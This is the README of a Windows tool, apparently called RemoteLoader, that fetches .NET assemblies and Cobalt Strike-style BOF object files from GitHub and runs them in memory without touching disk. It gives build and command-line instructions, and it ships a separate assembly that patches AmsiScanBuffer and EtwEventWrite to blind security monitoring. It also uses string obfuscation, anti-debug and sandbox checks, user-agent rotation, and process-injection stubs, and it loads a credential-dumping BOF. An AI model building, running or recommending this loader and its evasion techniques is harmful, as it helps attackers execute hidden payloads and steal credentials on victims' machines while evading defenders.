# RemoteLoader

In-memory loader for **managed .NET assemblies** and **x64 COFF/BOF** object files,
fetched at runtime from a GitHub repository. Nothing is written to disk: binaries
are pulled over HTTPS, optionally XOR-decoded, and executed reflectively in the
current process.

> `by hstn`

---

## Build

Requires the **.NET 8 SDK**.

### Loader

```powershell
dotnet publish RemoteLoader.csproj -c Release -r win-x64 --self-contained true `
    /p:PublishSingleFile=true /p:DebugType=embedded
```

Produces a single self-contained `RemoteLoader.exe`.

### Evasion bypass (separate assembly — see [Evasion](#evasion-opsec-decoupled))

```bash
dotnet build AmsiBypass/AmsiBypass.csproj -c Release
# -> AmsiBypass/bin/Release/net8.0/AmsiBypass.dll
```

Host that `AmsiBypass.dll` in a **private** GitHub repo folder and point
`--amsi-bypass` at it. It is **not** part of the loader binary.

---

## Usage

```
RemoteLoader.exe --repo owner/name/subfolder [options]
```

### Required

| Flag | Description |
|------|-------------|
| `--repo owner/name/subfolder` | GitHub path to the folder holding the payload. |

### Payload options

| Flag | Default | Description |
|------|---------|-------------|
| `--branch <branch>` | `main` | Repo branch. |
| `--token <PAT>` | — | GitHub PAT (private repos / higher rate limits). |
| `--xor <byte>` | `0` | XOR key (0–255) to decode the payload before loading. |
| `--list` | — | Print available binaries in the folder and exit. |
| `--exec <name>` | — | Select a binary by name/substring; skip the interactive menu. |
| `--args <string>` | — | Arguments passed to the loaded tool (see BOF arg format below). |
| `--bof-entry <name>` | `go` | BOF entry-point symbol name. |

### Evasion (external, OPSEC-decoupled)

| Flag | Default | Description |
|------|---------|-------------|
| `--amsi-bypass owner/name/subfolder` | — | GitHub path to a managed .NET evasion assembly, downloaded & reflectively executed **before** the main payload. |
| `--amsi-bypass-file <name>` | first `.exe`/`.dll` | Select the bypass binary by name/substring. |
| `--amsi-bypass-branch <branch>` | `main` | Bypass repo branch. |
| `--amsi-bypass-args <string>` | — | Args for the bypass assembly's `Main`. |
| `--amsi-bypass-xor <byte>` | `0` | XOR key to decode the bypass bytes before loading. |

### Anti-analysis

| Flag | Description |
|------|-------------|
| `--no-amrng` | Skip the anti-debug / sandbox checks. |

### Help

`--help` / `-h` — print the built-in reference.

## Interactive catalog browser (persistent REPL)

Without `--list`/`--exec`, RemoteLoader drops into a persistent `artifacts>`
prompt after enumerating the repo folder. It builds a reusable in-memory
catalog (normalized command alias, original filename, arch, size, kind) and
stays open across actions until you exit — no more re-selecting a number for
every action.

The catalog lives in pure, I/O-free types
(`ArtifactCatalog` / `ArtifactCatalogInstance` / `ArtifactEntry`),
the quote-aware tokenizer is `CmdTokenizer`, and the REPL is `ArtifactCli`;
`RemoteLoader` wires them onto the **existing** fetch / download /
validation / execution path (no new network or loading logic).

Filename aliases are normalized deterministically, e.g.
`BOFKatz.x64.o → bofkatz`, `Seatbelt.exe → seatbelt`, `arp.x64.o → arp`,
lowercased, with executable/object suffixes and arch markers stripped and
meaningful internal dots/dashes/underscores preserved.

### Commands

| Command | Description |
|---------|-------------|
| `list` | Show all artifacts: number, alias, original name, arch, size. |
| `search <term>` | Filter by alias / original filename / arch. |
| `info <name-or-number>` | Detailed metadata for one artifact. |
| `run <name-or-number> [args...]` | Execute one artifact (passes args through the existing handler). |
| `use <name-or-number>` | Set an active artifact; then bare arguments re-run it. |
| `<alias> [args]` | Run an **unambiguous** alias directly, e.g. `whoami /all`. |
| `refresh` | Re-query GitHub and rebuild the catalog. |
| `back` | Clear the active artifact; return to `artifacts>`. |
| `0` | Exit (at top) / back (when an artifact is active). Legacy shortcut. |
| `exit` / `quit` | Leave the tool. |

Collisions are never resolved silently: `tool.x64.o` + `tool.x86.o` +
`tool.exe` keep the short alias `tool` ambiguous (lists all variants) and gain
explicit `tool-x64` / `tool-x86` / `tool-exe` aliases. Reserved command words
(`help`, `list`, `run`, …) always win for bare input; an artifact whose
normalized name collides with one is reachable only via `run <alias>` / `use
<alias>`. Plain numbers and `0` keep working for backwards compatibility.

### Example

```
artifacts> list
 [ 1] whoami        whoami.x64.o          x64       6 KB
 [ 2] arp           arp.x64.o             x64       4 KB
 [ 3] bofkatz       BOFKatz.x64.o         x64      1451 KB
 [ 4] seatbelt      Seatbelt.exe          exe      820 KB

artifacts> use whoami
Active artifact: whoami (whoami.x64.o, x64)
Enter arguments, use "back" to return to the catalog, or "help" for commands.
whoami> /all
...
whoami> back
Returned to catalog.
artifacts> exit
```

### Suggestions & completion

A submitted *partial* that is not an exact alias is never auto-executed: the
REPL routes it through a terminal-independent suggestion engine
(`ArtifactSuggest.SuggestCommands(input, catalog, active)`) and prints matches,
then returns to the prompt. The user must retype/confirm — nothing is expanded
or run merely because it matched.

```
artifacts> bof
Suggestions:
  bofkatz

artifacts> run bo
Suggestions:
  bofkatz

artifacts> tool
"tool" matches multiple artifacts:
  tool-x64   tool.x64.o
  tool-x86   tool.x86.o
  tool-exe   tool.exe

Use one of the specific aliases, or run "info tool-x64".
```

Matching context:

- bare input at `artifacts>`: built-in commands + artifact aliases (a
  reserved-named artifact is offered only as the command, never as a bare
  artifact alias);
- after `run` / `use` / `info`: artifact aliases (incl. reserved-named, which are
  reachable here) plus `#<index>` numeric IDs when the partial is digits;
- after `search`: nothing (free-form);
- when an artifact is active: control commands only, so argument entry is not
  disturbed.

Priority is exact → prefix → substring → fuzzy (subsequence, used only when
there are no prefix matches), ordered shorter-then-alphabetical within a tier,
capped at 10 with a `Showing N of M` hint. The index is rebuilt from the live
catalog on every call, so it follows `refresh` with no extra GitHub traffic.

> Live tab completion is not wired: the REPL reads via `TextReader.ReadLine()`
> (redirectable/injectable for tests), so suggestions are surfaced after submit
> — the fallback the spec allows when real-time completion is impractical. The
> engine itself is terminal-independent and fully unit-tested.

---
## Payload types

### 1. Managed .NET assemblies (`.exe` / `.dll`)

Listed, downloaded, optionally XOR-decoded, and reflectively loaded via
`Assembly.Load(byte[])`. A static `Main` is located reflectively (a type named
`Program` is preferred, otherwise the first static `Main` found) and invoked with
either the no-arg or `string[]`-arg signature; `Task`/`Task<int>` results are
awaited.

### 2. COFF / BOF x64 object files (`.o`)

Loaded in-process by **BofRunner**: COFF is parsed, sections are mapped with
page protection derived from `Section.Characteristics`, symbols & relocations
are resolved, a curated set of **Beacon API stubs** is exposed, and the entry
point (default `go`) is invoked with a packed binary argument buffer.

Supported Beacon API surface (registered stubs):

- Output: `BeaconPrintf`, `BeaconOutput`
- Data: `BeaconDataParse`, `BeaconDataInt`, `BeaconDataShort`, `BeaconDataLength`, `BeaconDataPtr`, `BeaconDataExtract`
- Format: `BeaconFormatAlloc/Reset/Free/Append/Printf/Int/ToString`
- Token / admin: `BeaconUseToken`, `BeaconRevertToken`, `BeaconIsAdmin`
- Spawn / inject: `BeaconGetSpawnTo`, `BeaconSpawnTemporaryProcess`, `BeaconInjectProcess`, `BeaconInjectTemporaryProcess`, `BeaconCleanupProcess`
- Utility: `toWideChar`, `BeaconDownload`, `BeaconGetOutputData`
- Value store: `BeaconAddValue`, `BeaconGetValue`, `BeaconRemoveValue`
- Memory: `BeaconVirtualAlloc`, `BeaconVirtualAllocEx`, `BeaconVirtualFree`
- `__stack_chk_fail` (ucrt stack-protector fallback)

Win32 / CRT imports resolve via Cobalt-Strike **DFR** syntax
(`MODULE$Function`, e.g. `KERNEL32$VirtualAlloc`, `MSVCRT$memcpy`) through
`GetProcAddress`.

**BeaconPrintf / BeaconFormatPrintf** are fully variadic: `%d %i %u %lu %ld %lld
%x %X %p %s %S %c %%` (plus flags/width/precision/length modifiers) are expanded
using the x64 varargs the BOF passed (first four in registers, the rest on the
stack). `BeaconOutput` honours `CALLBACK_OUTPUT_UTF8`.

**BOF argument format** (`--args`):

```
i=<int32>   s=<int16>   z=<ascii>   Z=<wide>   b=<hex>
```

Tokens are concatenated in order into the byte stream `BeaconDataParse` /
`BeaconDataExtract` consume. Example: `--args "z=coffee z=exit"`.

> Tip: a bare token like `coffee` (no `z=` prefix) is **ignored** by the packer
> and the BOF receives an empty arg buffer — which most BOFs treat as
> "use defaults". Prefix arguments explicitly with their type token.

### Relocation handling (AMD64)

Implemented: `ADDR64`, `ADDR32NB` (`.pdata` SEH RVAs), and `REL32`…`REL32_5`.

`REL32`/`ADDR64` are applied **additively** — the displacement field already
holds the target's in-section offset (the addend a real linker folds in), so the
patch *adds* the resolved base rather than overwriting it. Overwriting would
collapse every RIP-relative data reference (format strings, the shellcode
pointer, …) onto the section base, making all `BeaconPrintf` output show the
first `.rdata` string. Indirect call sites carry a `0` addend, so `0 + x == x`
and they are unaffected.

---

## Evasion (OPSEC-decoupled)

The loader itself performs **no** in-process AMSI/ETW/`.text` patching — earlier
in-process patchers (`AmsiScanBuffer`, `EtwEventWrite`, HWBP, IAT hooks) were
trivially caught by memory-integrity / behaviour monitors and killed the process
before the GitHub fetch completed. All of that was removed so the loader leaves a
zero memory-patching footprint.

Evasion is delegated to a **separate, operator-maintained .NET assembly**
supplied via `--amsi-bypass`. It is downloaded and reflectively executed
**before** the main payload, so you can rotate techniques without rebuilding the
loader and without shipping a famous, signatured patch in the binary.

### Companion assembly: `AmsiBypass/`

A baseline you host in a private repo and rotate independently:

- `Program.Main` (discovered reflectively by the loader) disarms
  `amsi.dll!AmsiScanBuffer` (fail-open: returns `E_INVALIDARG`), with read-back
  verification.
- `--etw` also no-ops `ntdll!EtwEventWrite`.
- `--check` is a locate-only dry run.
- It is a **library** (`AmsiBypass.dll`), not an `Exe`: an SDK `Exe` emits a
  native apphost stub that RemoteLoader's `IsNetAssembly` check rejects — host
  the `.dll`.
- The patch opcodes are derived at runtime from the HRESULT, and the dll/export
  names are assembled from code points, so neither the source nor the IL carry
  the obvious tell-tale strings. Treat it as a starting point to customise, not a
  finished stealth dropper.

### Putting it together

```bash
RemoteLoader.exe \
  --amsi-bypass you/priv-repo/evasion --amsi-bypass-file AmsiBypass \
  --repo you/priv-repo/payload --exec MyTool.exe --args "..."
```

### Caveat (chicken-and-egg)

RemoteLoader still AMSI-scans the bypass assembly's own bytes during its
`Assembly.Load`. `--amsi-bypass-xor` only hides the *at-rest* file from static
repo scanning — it does **not** hide the *decoded* bytes from the runtime scan.
Keep the bypass custom / un-signatured and rotate it. If the bypass load is
blocked (`.NET` surfaces it as `0x800700E1`), RemoteLoader detects it, warns, and
**continues** to the main payload (bypass failure is non-fatal).

---

## OPSEC notes

- No memory-patching footprint in the loader.
- Sandbox / anti-debug checks fail silently and degrade to a quiet fail
  (`--no-amrng` skips them).
- The HTTP client honours host proxy settings and rotates through a 24-entry
  user-agent pool seeded from the CSPRNG.

---

## Project layout

```
RemoteLoader/
├── RemoteLoader.cs        # loader: CLI, GitHub fetch, reflective .NET exec, BOF dispatch
├── ArtifactCatalog.cs    # discovery/normalization/resolution (pure, no I/O)
├── ArtifactCli.cs         # persistent `artifacts>` REPL layered over the loader
├── CmdTokenizer.cs        # quote-aware token splitter shared by the REPL
├── BofRunner.cs           # in-process x64 COFF/BOF loader + Beacon API stubs
├── RemoteLoader.csproj
├── AmsiBypass/            # SEPARATE evasion assembly (built & hosted independently)
│   ├── Program.cs         #   Program.Main -> disarm AmsiScanBuffer (+ optional --etw)
│   └── AmsiBypass.csproj
├── RemoteLoader.Tests/   # xUnit tests for catalog/normalizer/REPL (excluded from loader build)
└── .gitignore             # bin/ obj/ excluded
```

`RemoteLoader.csproj` explicitly excludes `AmsiBypass\**` from its compile glob,
so the two ship as independent assemblies.
